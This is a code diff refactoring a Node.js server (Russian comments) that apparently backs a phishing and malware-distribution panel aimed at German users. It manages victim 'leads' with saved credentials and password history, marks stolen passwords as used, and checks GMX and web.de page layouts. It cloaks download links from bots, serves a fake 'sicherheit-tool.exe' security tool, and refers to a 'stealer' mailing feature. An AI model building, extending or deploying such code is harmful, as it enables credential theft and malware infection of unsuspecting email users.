@@ -10,7 +10,10 @@ const fs = require('fs');
 const path = require('path');
 const { PROJECT_ROOT, DATA_DIR, initAppServices } = require('./core/bootstrap');
 const { mergeServiceRouteDeps } = require('./core/routeHttpDeps');
-const { isAdminRequest } = require('./core/adminPaths');
+const { handleApiRequestChain } = require('./core/httpApiDispatch');
+const { handleFastPreGateRoutes, handlePreStaticSpecialRoutes } = require('./core/httpSpecialRoutes');
+const { handleDownloadRoutes } = require('./core/httpDownloadRoutes');
+const { isAdminRequest, isAdminPagePath, isAdminLoginPath, isAdminDomainAllowedPath } = require('./core/adminPaths');
 const { attachAdminLeadsWebSocket } = require('./services/wsAdminBroadcast');
 const url = require('url');
 const os = require('os');
@@ -38,7 +41,7 @@ const {
   DB_PATH
 } = require('./db/database.js');
 const { send, safeEnd, readApiRouteBody, parseHttpRequestUrl } = require('./utils/httpUtils');
-const { ADMIN_TOKEN, ADMIN_DOMAIN, checkAdminAuth, getAdminTokenFromRequest } = require('./utils/authUtils');
+const { ADMIN_DOMAIN, checkAdminAuth, hasValidAdminSession, PASSWORD_AUTH_ENABLED, WORKER_SECRET } = require('./utils/authUtils');
 const { getPlatformFromRequest, maskEmail, EVENT_LABELS, readStartPage, getRedirectPasswordStatus } = require('./utils/formatUtils');
 const apiRoutes = require('./routes/apiRoutes');
 const clientRoutes = require('./routes/clientRoutes');
@@ -48,6 +51,7 @@ const staticRoutes = require('./routes/staticRoutes');
 const chatService = require('./services/chatService');
 const leadService = require('./services/leadService');
 const automationService = require('./services/automationService');
+const { startAutoBackups } = require('./services/backupService');
 
 const readLeads = () => leadService.readLeads();
 const readLeadsAsync = (cb) => leadService.readLeadsAsync(cb);
@@ -793,11 +797,12 @@ automationService.init({
   pushEvent,
   writeDebugLog,
   logTerminalFlow,
+  readMode,
   readAutoScript,
   readStartPage,
   leadHasKleinMarkedData,
   EVENT_LABELS,
-  getAdminToken: () => ADMIN_TOKEN,
+  getWorkerSecret: () => WORKER_SECRET,
   serverProjectRoot: PROJECT_ROOT,
 });
 
@@ -982,6 +987,7 @@ const API_ROUTE_DEPS = {
 };
 
 const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
+  ADMIN_DOMAIN,
   ALLOWED_EMAIL_DOMAINS: ALLOWED_EMAIL_DOMAINS,
   ALLOWED_EMAIL_DOMAINS_RAW: ALLOWED_EMAIL_DOMAINS_RAW,
   ALL_LOG_FILE: ALL_LOG_FILE,
@@ -1096,6 +1102,8 @@ const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
   path: path,
   persistLeadFull: persistLeadFull,
   persistLeadPatch: persistLeadPatch,
+  updateLeadPasswordVersioned: leadService.updateLeadPasswordVersioned,
+  markPasswordConsumedByAttempt: leadService.markPasswordConsumedByAttempt,
   processArchiveToGmx: processArchiveToGmx,
   pushEvent: pushEvent,
   pushPasswordHistory: pushPasswordHistory,
@@ -1115,6 +1123,10 @@ const ROUTE_HTTP_DEPS = mergeServiceRouteDeps({
   readDownloadSettings: readDownloadSettings,
   readLeads: readLeads,
   readLeadsAsync: readLeadsAsync,
+  readLeadById: leadService.readLeadById,
+  findLeadIdByEmail: leadService.findLeadIdByEmail,
+  findAllLeadIdsByEmailNormalized: leadService.findAllLeadIdsByEmailNormalized,
+  deleteLeadById: leadService.deleteLeadById,
   readMode: readMode,
   readModeData: readModeData,
   readSavedCredentials: readSavedCredentials,
@@ -1173,7 +1185,7 @@ const server = http.createServer(async (req, res) => {
     res.writeHead(200, {
       'Access-Control-Allow-Origin': '*',
       'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
+      'Access-Control-Allow-Headers': 'Content-Type, x-worker-secret',
       'Access-Control-Max-Age': '86400'
     });
     res.end();
@@ -1183,13 +1195,7 @@ const server = http.createServer(async (req, res) => {
   const parsed = parseHttpRequestUrl(req);
   let pathname = parsed.pathname;
 
-  // Ранний лёгкий ответ для проверки, что сервер живой (до readShortDomains и прочей логики)
-  if ((pathname === '/health' || pathname === '/ping') && req.method === 'GET') {
-    if (safeEnd(res)) return;
-    res.writeHead(200, { 'Content-Type': 'text/plain', 'Cache-Control': 'no-store' });
-    res.end('ok');
-    return;
-  }
+  if (handleFastPreGateRoutes(req, res, pathname, { safeEnd, short })) return;
 
   const MAX_POST_BODY_BYTES = 50 * 1024 * 1024;
   if (req.method === 'POST' && req.headers['content-length']) {
@@ -1206,23 +1212,10 @@ const server = http.createServer(async (req, res) => {
     req.on('timeout', () => { req.destroy(); });
   }
 
-  // Сокращалка: /s/:slug → редирект (бекенд в short/)
-  const shortlinkMatch = pathname.match(/^\/s\/([a-zA-Z0-9_-]+)$/);
-  if (shortlinkMatch && req.method === 'GET') {
-    const slug = shortlinkMatch[1];
-    const target = short.resolveShortLink(slug);
-    if (target) {
-      if (safeEnd(res)) return;
-      res.writeHead(302, { 'Location': target, 'Cache-Control': 'no-store' });
-      res.end();
-      return;
-    }
-  }
-
   const requestHost = (req.headers.host || '').split(':')[0].toLowerCase();
   const isLocalhost = requestHost === 'localhost' || requestHost === '127.0.0.1' || requestHost === '';
-  const isAdminPage = pathname === '/admin' || pathname === '/admin/';
-  const isAdminHtml = pathname === '/admin.html';
+  const isAdminPage = isAdminPagePath(pathname);
+  const isAdminLoginPage = isAdminLoginPath(pathname);
   const shortDomainsList = getShortDomainsList();
   const shortHostNorm = requestHost.replace(/^www\./, '');
   const shortDomainKey = shortDomainsList[requestHost] ? requestHost : (shortDomainsList[shortHostNorm] ? shortHostNorm : null);
@@ -1233,9 +1226,10 @@ const server = http.createServer(async (req, res) => {
     requestHost,
     isLocalhost,
     isAdminPage,
-    isAdminHtml,
+    isAdminLoginPage,
     ADMIN_DOMAIN,
     isAdminRequest,
+    isAdminDomainAllowedPath,
     isShortDomain,
     shortDomainKey,
     shortDomainsList,
@@ -1254,127 +1248,46 @@ const server = http.createServer(async (req, res) => {
     (req.method === 'GET' && gateMiddleware.isProtectedPage(pathname));
   if (isUserPath && gateMiddleware.hasGateCookie(req)) setFirstGateTime(ip);
 
-  if (pathname.startsWith('/api/')) {
-    let body = '';
-    if (apiRoutes.needsRequestBody(req.method, pathname)) {
-      body = await readApiRouteBody(req, MAX_POST_BODY_BYTES);
-    }
-    let handled = false;
-    try {
-      handled = await apiRoutes.handleApiRoute(req, res, parsed, body, API_ROUTE_DEPS);
-    } catch (err) {
-      console.error('[apiRoutes]', err);
-      if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
-      return;
-    }
-    if (handled) return;
+  if (await handleApiRequestChain(req, res, parsed, pathname, ip, {
+    apiRoutes,
+    clientRoutes,
+    adminRoutes,
+    API_ROUTE_DEPS,
+    ROUTE_HTTP_DEPS,
+    readApiRouteBody,
+    send,
+    safeEnd,
+    maxPostBodyBytes: MAX_POST_BODY_BYTES,
+  })) return;
 
-    const ROUTE_HTTP_MERGED = Object.assign({}, ROUTE_HTTP_DEPS, { ip });
-    try {
-      if (await clientRoutes.handleRoute(req, res, parsed, body, ROUTE_HTTP_MERGED)) return;
-    } catch (err) {
-      console.error('[clientRoutes]', err);
-      if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
-      return;
-    }
-    try {
-      const adminHandled = await adminRoutes.handleRoute(req, res, parsed, body, ROUTE_HTTP_MERGED);
-      if (adminHandled) return;
-    } catch (err) {
-      console.error('[adminRoutes]', err);
-      if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
-      return;
-    }
-  }
-
-  if (pathname === '/api/brand' && req.method === 'GET') {
-    if (safeEnd(res)) return;
-    const brand = getBrand(req);
-    res.writeHead(200, {
-      'Content-Type': 'application/json',
-      'Cache-Control': 'public, max-age=300',
-      'Access-Control-Allow-Origin': '*'
-    });
-    res.end(JSON.stringify(brand));
-    return;
-  }
-
-  if (pathname === '/gate-white' && req.method === 'GET') {
-    gateMiddleware.handleGateWhite(req, res, getBrand, getShortDomainsList);
-    return;
-  }
+  if (handlePreStaticSpecialRoutes(req, res, pathname, {
+    safeEnd,
+    getBrand,
+    gateMiddleware,
+    getShortDomainsList,
+  })) return;
 
   if (gateMiddleware.handleProtectedPageGate(req, res, pathname, getBrand)) return;
 
   const ROUTE_HTTP_MERGED_STATIC = Object.assign({}, ROUTE_HTTP_DEPS, { ip });
 
-  // Скачивание: /download/<имя_файла>?t=TOKEN — только с одноразовым токеном (боты не получают ссылку). Админка может без токена.
-  const downloadFileMatch = pathname.match(/^\/download\/([^/?#]+)$/);
-  if (downloadFileMatch && req.method === 'GET') {
-    const token = (parsed.query && parsed.query.t) ? String(parsed.query.t).trim() : '';
-    let fileName = null;
-    if (token) {
-      fileName = consumeDownloadToken(token);
-    } else if (requestHost === ADMIN_DOMAIN || getAdminTokenFromRequest(req, parsed) === ADMIN_TOKEN) {
-      let rawName;
-      try {
-        rawName = decodeURIComponent(downloadFileMatch[1]).replace(/\0/g, '');
-      } catch (e) {
-        rawName = downloadFileMatch[1].replace(/\0/g, '');
-      }
-      fileName = path.basename(rawName);
-    }
-    if (!fileName) {
-      if (safeEnd(res)) return;
-      res.writeHead(403, { 'Content-Type': 'text/plain; charset=utf-8' });
-      res.end('Forbidden');
-      return;
-    }
-    if (!checkRateLimit(ip, 'downloadGet', RATE_LIMITS.downloadGet)) {
-      if (safeEnd(res)) return;
-      res.writeHead(429, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ ok: false, error: 'too_many_requests' }));
-      return;
-    }
-    const fullPath = findDownloadFile(fileName);
-    if (fullPath) {
-      const displayName = path.basename(fullPath);
-      incrementDownloadCount(fileName);
-      const ext = path.extname(fullPath).toLowerCase();
-      const contentType = ext === '.zip' ? 'application/zip' : 'application/octet-stream';
-      var fileSize = 0;
-      try { fileSize = fs.statSync(fullPath).size; } catch (e) {}
-      if (safeEnd(res)) return;
-      var downloadHeaders = {
-        'Content-Type': contentType,
-        'Content-Disposition': 'attachment; filename="' + sanitizeFilenameForHeader(displayName) + '"',
-        'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
-        'Pragma': 'no-cache'
-      };
-      if (fileSize > 0) downloadHeaders['Content-Length'] = String(fileSize);
-      res.writeHead(200, downloadHeaders);
-      const stream = fs.createReadStream(fullPath);
-      stream.on('error', function (err) {
-        console.error('[SERVER] download stream error:', fileName, err.message || err);
-        try { if (!res.writableEnded) res.end(); } catch (e) {}
-      });
-      stream.pipe(res);
-      return;
-    }
-    return send(res, 404, 'Not Found', 'text/plain');
-  }
-
-  // Старые URL скачивания — редирект на текущий файл по имени (или 404)
-  if ((pathname === '/download/sicherheit-tool' || pathname === '/download/sicherheit-tool.zip' || pathname === '/download/sicherheit-tool.exe') && req.method === 'GET') {
-    const info = getSicherheitDownloadFile();
-    if (info && info.fileName) {
-      if (safeEnd(res)) return;
-      res.writeHead(302, { 'Location': '/download/' + encodeURIComponent(info.fileName), 'Cache-Control': 'no-store' });
-      res.end();
-      return;
-    }
-    return send(res, 404, 'Not Found', 'text/plain');
-  }
+  if (handleDownloadRoutes(req, res, parsed, pathname, {
+    ADMIN_DOMAIN,
+    requestHost,
+    hasValidAdminSession,
+    consumeDownloadToken,
+    checkRateLimit,
+    RATE_LIMITS,
+    ip,
+    findDownloadFile,
+    incrementDownloadCount,
+    sanitizeFilenameForHeader,
+    safeEnd,
+    send,
+    fs,
+    path,
+    getSicherheitDownloadFile,
+  })) return;
 
   try {
     await staticRoutes.handleRoute(req, res, parsed, '', ROUTE_HTTP_MERGED_STATIC);
@@ -1400,10 +1313,10 @@ if (WebSocketServer) {
   console.log('[SERVER] WebSocket не подключён (установите: npm install ws)');
 }
 
-// Production: требовать ADMIN_TOKEN (иначе админка открыта без пароля)
+// Production: требовать пару ADMIN_USERNAME + ADMIN_PASSWORD
 const isProduction = (process.env.NODE_ENV || '').toLowerCase() === 'production';
-if (isProduction && !ADMIN_TOKEN) {
-  writeFatalSync('[SERVER] NODE_ENV=production: задайте ADMIN_TOKEN в .env или окружении. Без токена админка не защищена.');
+if (isProduction && !PASSWORD_AUTH_ENABLED) {
+  writeFatalSync('[SERVER] NODE_ENV=production: задайте ADMIN_USERNAME+ADMIN_PASSWORD в .env. Иначе админка не защищена.');
   process.exit(1);
 }
 
@@ -1419,6 +1332,8 @@ process.on('unhandledRejection', (reason, promise) => {
 
 // При старте: создать критичные каталоги и сообщить о необязательных зависимостях
 ensureDataFile();
+const db = getDb();
+startAutoBackups(db);
 if (!fs.existsSync(DOWNLOADS_DIR)) fs.mkdirSync(DOWNLOADS_DIR, { recursive: true });
 if (!mailService.getNodemailer()) console.log('[SERVER] nodemailer не установлен — рассылка stealer/warmup недоступна (npm install nodemailer)');
 if (!WebSocketServer) console.log('[SERVER] ws не установлен — обновление админки в реальном времени отключено (npm install ws)');
@@ -1469,7 +1384,10 @@ server.listen(PORT, HOST, () => {
   scheduleWebdeLayoutHealthcheck();
 });
 
+let isShuttingDown = false;
 function shutdown() {
+  if (isShuttingDown) return;
+  isShuttingDown = true;
   try {
     automationService.killAllSpawnedAutomationChildrenSync();
   } catch (_) {}
@@ -1490,5 +1408,14 @@ process.on('SIGTERM', () => {
 process.on('SIGINT', () => {
   console.log('\nПолучен SIGINT, завершаю работу...');
   shutdown();
+});
+
+process.on('exit', () => {
+  try {
+    automationService.killAllSpawnedAutomationChildrenSync();
+  } catch (_) {}
+  try {
+    closeDb();
+  } catch (_) {}
 });
 
